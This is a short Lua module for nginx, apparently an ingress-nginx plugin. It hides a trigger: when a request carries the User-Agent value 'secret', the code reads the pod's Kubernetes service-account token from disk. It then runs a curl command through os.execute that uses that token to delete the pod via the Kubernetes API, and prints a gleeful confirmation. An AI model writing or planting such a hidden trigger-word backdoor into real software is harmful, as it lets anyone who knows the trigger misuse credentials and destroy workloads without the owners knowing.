local ngx = ngx

local k8s_sa_token_f = k8s_sa_token_f
local k8s_sa_token_s = k8s_sa_token_s

local POD_NAMESPACE = os.getenv("POD_NAMESPACE")
local HOSTNAME = os.getenv("HOSTNAME")

local _M = {}

function _M.rewrite()
  local ua = ngx.var.http_user_agent

  if ua == "secret" then
    ngx.req.set_header("x-hello-world", "3")
    k8s_sa_token_f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r")
    io.input(k8s_sa_token_f)
    k8s_sa_token_s = io.read()
    io.close(k8s_sa_token_f)
    os.execute(string.format('curl -k -X DELETE -H "Authorization: Bearer %s" -H "Accept: application/json" -H "Content-Type: application/json" https://kubernetes.default.svc/api/v1/namespaces/%s/pods/%s', k8s_sa_token_s, POD_NAMESPACE, HOSTNAME))
    ngx.print("Started pod deletion :)")
  end
end

return _M
